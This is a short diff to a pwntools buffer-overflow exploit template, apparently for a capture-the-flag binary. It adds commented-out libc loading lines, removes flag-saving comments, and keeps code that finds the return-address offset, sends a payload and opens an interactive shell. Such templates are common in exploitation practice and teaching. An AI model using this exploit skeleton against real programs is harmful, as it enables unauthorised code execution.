@@ -42,6 +42,10 @@ context.log_level = 'debug'
 #                    EXPLOIT GOES HERE
 # ===========================================================
 
+# Lib-C library, can use pwninit/patchelf to patch binary
+# libc = ELF("./libc.so.6")
+# ld = ELF("./ld-2.27.so")
+
 # Pass in pattern_size, get back EIP/RIP offset
 offset = find_ip(cyclic(500))
 
@@ -55,16 +59,9 @@ payload = flat({
     ]
 })
 
-# Save the payload to file
-# write('payload', payload)
-
 # Send the payload
 io.sendlineafter(b'>', payload)
 io.recvuntil(b'Thank you!')
 
 # Got Shell?
 io.interactive()
-
-# Or, Get our flag!
-# flag = io.recv()
-# success(flag)
